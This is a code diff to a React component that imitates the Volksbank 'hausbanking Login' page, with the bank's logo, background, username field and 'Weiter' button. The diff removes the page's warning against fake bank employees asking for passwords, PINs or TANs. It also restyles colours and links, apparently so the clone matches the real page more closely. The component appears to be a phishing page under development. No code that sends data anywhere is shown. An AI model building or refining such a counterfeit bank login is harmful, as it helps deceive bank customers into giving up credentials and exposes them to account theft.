@@ -1,7 +1,6 @@
 import { useState } from "react";
 import volksbankLogo from "@/assets/volksbank-logo.png";
 import volksbankBg from "@/assets/volksbank-bg.png";
-import { AlertTriangle } from "lucide-react";
 
 const Volksbank = () => {
   const [username, setUsername] = useState("");
@@ -29,49 +28,30 @@ const Volksbank = () => {
           {/* Blue header bar */}
           <div
             className="px-6 py-4 text-white font-semibold text-lg"
-            style={{ backgroundColor: "#00579B" }}
+            style={{ backgroundColor: "#196bc1" }}
           >
             hausbanking Login
           </div>
 
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
-            {/* Warning box */}
-            <div
-              className="flex items-start gap-3 p-4 rounded"
-              style={{ backgroundColor: "#FFF8E1", border: "1px solid #E08A00" }}
-            >
-              <AlertTriangle className="w-6 h-6 flex-shrink-0 mt-0.5" style={{ color: "#E08A00" }} />
-              <div className="text-sm" style={{ color: "#E08A00" }}>
-                <p className="font-bold mb-1">
-                  Achtung: Anrufe FALSCHER Bankmitarbeiter!
-                </p>
-                <p>
-                  NIEMALS Passwörter, PINs oder TANs an Anrufer weitergeben!
-                </p>
-                <p>
-                  SOFORT auflegen und Ihre Bank kontaktieren!
-                </p>
-              </div>
-            </div>
-
             {/* Info text */}
-            <p className="text-sm" style={{ color: "#666" }}>
+            <p className="text-sm" style={{ color: "#333" }}>
               Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre
               Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
             </p>
 
             {/* Label row */}
             <div className="flex items-center justify-between">
-              <span className="font-semibold text-sm" style={{ color: "#333" }}>
+              <span className="font-semibold text-sm" style={{ color: "#999" }}>
                 Anmeldung mit Benutzername
               </span>
               <span className="text-sm space-x-2">
-                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#00579B" }}>
+                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
                   Barrierefrei
                 </a>
                 <span style={{ color: "#999" }}>|</span>
-                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#00579B" }}>
+                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
                   English
                 </a>
               </span>
@@ -82,32 +62,23 @@ const Volksbank = () => {
               type="text"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
-              className="w-full px-3 py-2.5 border rounded text-sm outline-none focus:ring-2"
+              className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors focus:ring-2 focus:ring-[#196bc1] focus:border-[#196bc1] focus:bg-[#f0f5ff]"
               style={{
-                backgroundColor: "#f5f5f5",
-                borderColor: "#ccc",
+                backgroundColor: "#e8e8e8",
+                borderColor: "#999",
               }}
               placeholder=""
             />
 
             {/* Terms text */}
-            <p className="text-xs text-center" style={{ color: "#888" }}>
-              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den{" "}
-              <a
-                href="#"
-                onClick={(e) => e.preventDefault()}
-                style={{ color: "#00579B" }}
-                className="underline"
-              >
-                Nutzungsbedingungen
-              </a>{" "}
-              der Bank ausdrücklich zu.
+            <p className="text-sm" style={{ color: "#333" }}>
+              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
             </p>
 
             {/* Weiter button */}
             <button
               className="w-full py-3 text-white font-semibold rounded text-sm"
-              style={{ backgroundColor: "#00579B" }}
+              style={{ backgroundColor: "#196bc1" }}
             >
               Weiter
             </button>
@@ -117,16 +88,16 @@ const Volksbank = () => {
               <a
                 href="#"
                 onClick={(e) => e.preventDefault()}
-                className="text-sm underline"
-                style={{ color: "#00579B" }}
+                className="text-sm no-underline hover:underline"
+                style={{ color: "#196bc1" }}
               >
                 Benutzername vergessen?
               </a>
               <a
                 href="#"
                 onClick={(e) => e.preventDefault()}
-                className="text-sm underline"
-                style={{ color: "#00579B" }}
+                className="text-sm no-underline hover:underline"
+                style={{ color: "#196bc1" }}
               >
                 Passwort vergessen?
               </a>
